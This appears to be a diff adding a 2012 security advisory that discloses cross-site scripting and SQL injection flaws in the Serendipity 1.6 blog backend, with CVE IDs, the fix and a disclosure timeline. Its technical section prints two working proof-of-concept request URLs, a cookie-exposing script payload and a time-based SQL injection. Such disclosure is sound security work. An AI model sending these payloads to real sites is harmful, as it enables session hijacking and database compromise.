@@ -1,0 +1,51 @@
+Advisory:		Serendipity 1.6 Backend Cross-Site Scripting and SQL-Injection vulnerability
+Advisory ID:		KORAMIS-ADV2012-001
+Contact:		security@koramis.de
+Author:			Stefan Schurtz
+Affected Software:	Successfully tested on Serendipity 1.6
+Vendor URL:		http://www.s9y.org
+Vendor Status:		fixed
+CVE-ID:			CVE-2012-2331,CVE-2012-2332
+
+==========================
+Vulnerability Description:
+==========================
+
+The Serendipity backend is prone to a Cross-Site Scripting and SQL-Injection vulnerability.
+
+==================
+Technical Details:
+==================
+
+# Cross Site-Scripting (CVE-2012-2331)
+http://[target]/serendipity/serendipity_admin_image_selector.php?serendipity[textarea]='"</script><script>alert(document.cookie)</script>
+
+# SQL-Injection (CVE-2012-2332)
+http://[target]/serendipity/serendipity_admin.php?serendipity[adminModule]=plugins&serendipity[plugin_to_conf]=-1' OR SLEEP(10)=0 LIMIT 1--+
+
+=========
+Solution:
+=========
+
+Upgrade to version 1.6.1
+
+====================
+Disclosure Timeline:
+====================
+
+21-Apr-2012 - informed developers
+22-Apr-2012 - feedback from developer
+08-May-2012 - fixed in version 1.6.1
+
+========
+Credits:
+========
+
+Vulnerabilities found and advisory written by Stefan Schurtz (KORAMIS Security Team).
+
+===========
+References:
+===========
+
+http://www.koramis.com/advisories/2012/KORAMIS-ADV2012-001.txt
+http://blog.s9y.org/archives/240-Serendipity-1.6.1-released.html
